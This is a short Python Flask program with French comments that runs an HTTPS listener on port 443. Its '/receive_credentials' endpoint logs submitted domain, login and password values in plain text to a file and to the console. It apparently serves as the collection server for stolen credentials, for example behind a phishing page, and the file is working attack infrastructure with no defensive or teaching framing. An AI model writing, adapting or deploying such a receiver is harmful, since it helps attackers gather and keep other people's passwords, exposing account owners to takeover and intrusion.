from flask import Flask, request
import logging
from datetime import datetime

app = Flask(__name__)

# Configuration du logging
logging.basicConfig(filename='requests.log', level=logging.INFO, 
                    format='%(asctime)s - %(message)s', datefmt='%d-%b-%y %H:%M:%S')

# Variable pour contrôler l'affichage en console
PRINT_TO_CONSOLE = True

# Code couleur
GREEN = '\033[92m'
RESET = '\033[0m'

def log_request(req):
    timestamp = datetime.now().strftime("%d-%b-%y %H:%M:%S")
    log_message = f"[+] {timestamp} - Domain: {req.form.get('domain', 'None')}, Login: {req.form.get('login', 'None')}, Password: {req.form.get('password', 'None')}"
    
    # Logging dans un fichier
    logging.info(log_message)
    
    # Affichage en console si activé
    if PRINT_TO_CONSOLE:
        print(f"{GREEN}{log_message}{RESET}")

@app.route('/receive_credentials', methods=['POST'])
def receive_credentials():
    log_request(request)
    return "OK", 200

@app.route('/health', methods=['GET'])
def health_check():
    return "Healthy", 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=443, ssl_context=('cert.pem', 'key.pem'))
